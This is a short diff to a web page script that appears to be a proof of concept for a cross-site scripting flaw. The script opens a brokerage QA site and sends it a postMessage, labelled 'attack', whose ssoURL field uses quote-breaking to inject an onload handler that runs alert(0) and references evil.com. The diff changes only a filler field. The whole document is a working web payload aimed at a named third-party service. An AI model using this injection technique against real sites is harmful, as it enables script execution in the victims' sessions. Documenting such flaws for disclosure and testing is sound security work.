@@ -41,7 +41,7 @@ title: Home
 <script>
  var foliodx = window.open("https://qa8.foliodx.com/brokerage/AControlServlet","Folio");
  (5);
- var message= {"type":"message","data":{"abc":"fillhere","request":"attack","eventName":"folioActionLaunch","data":{"ssoURL":"http://evil.com' onload='alert(0);'"}}}
+ var message= {"type":"message","data":{"abc":"def","request":"attack","eventName":"folioActionLaunch","data":{"ssoURL":"http://evil.com' onload='alert(0);'"}}}
  setTimeout(foliodx.postMessage(message,"*"), 3000);
 </script>
   
